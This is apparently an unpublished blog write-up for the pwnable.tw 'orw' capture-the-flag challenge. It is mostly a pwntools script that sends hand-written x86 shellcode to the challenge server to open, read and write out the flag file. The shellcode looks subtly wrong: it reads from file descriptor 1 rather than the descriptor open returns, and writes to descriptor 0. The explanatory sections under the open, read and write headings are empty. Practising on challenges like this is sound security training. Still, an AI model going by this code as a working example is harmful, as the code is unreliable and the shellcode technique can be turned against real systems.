---
layout: post
title: 'Pwnable: orw'
subtitle: A challenge about writing your own shellcode.
published: false
---
>Read the flag from /home/orw/flag.
>
>Only open read write syscall are allowed to use.
>
>nc chall.pwnable.tw 10001

This challenge is mainly about writing your own shellcode.

Let's find out about open() syscall:

read() syscall:

write() syscall:



If you want to make syscall you will must have int 0x80.



  from pwn import *


  conn = remote('chall.pwnable.tw', 10001)
  conn.recv(20)
  shellcode = asm("mov  ecx, 0; push 0x67616c66;  push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f;")

      #open
  shellcode += asm("mov ebx, esp; mov eax, 5; int 80h;")

      #read
  shellcode += asm("mov edx, 30h; mov ecx, esp; mov ebx, 1; mov eax, 3; int 80h;")

      #write
  shellcode += asm("mov edx, 30h; mov ecx, esp; mov ebx, 0; mov eax, 4; int 80h")

      #exit
  shellcode += asm('mov eax, 1; int 80h;')


  conn.send(shellcode)
  conn.interactive()
  conn.close()